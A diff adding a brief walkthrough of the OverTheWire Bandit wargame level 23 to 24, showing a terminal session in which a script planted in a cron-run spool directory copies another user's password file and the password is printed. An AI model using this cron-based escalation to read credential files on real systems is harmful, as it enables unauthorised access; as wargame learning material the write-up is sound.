@@ -1,0 +1,41 @@
+Get bandit24 to tun a script for us. 
+
+bandit23@bandit:~$ cd /etc/cron.d/ 
+bandit23@bandit:/etc/cron.d$ ls
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+bandit23@bandit:~$ mkdir /tmp/123some
+bandit23@bandit:~$ chmod 777 /tmp/123some
+bandit23@bandit:~$ cd /tmp/123some
+bandit23@bandit:/tmp/123some$ vi script.sh
+bandit23@bandit:/tmp/123some$ ls
+script.sh
+bandit23@bandit:/tmp/123some$ cat script.sh 
+cat /etc/bandit_pass/bandit24 > pass24.txt
+bandit23@bandit:/tmp/123some$ chmod 777 script.sh 
+bandit23@bandit:/tmp/123some$ cp script.sh /var/spool/bandit24/.
+bandit23@bandit:/tmp/123some$ ls -al /var/spool/bandit24/
+total 480
+drwxrwx--- 2 bandit24 bandit23 479232 Sep 10 01:53 .
+drwxr-xr-x 5 root     root       4096 Oct 16  2018 ..
+-rw-r--r-- 1 bandit24 bandit24     33 Sep 10 01:53 pass24.txt
+bandit23@bandit:/tmp/123some$ cat /var/spool/bandit24/pass24.txt 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
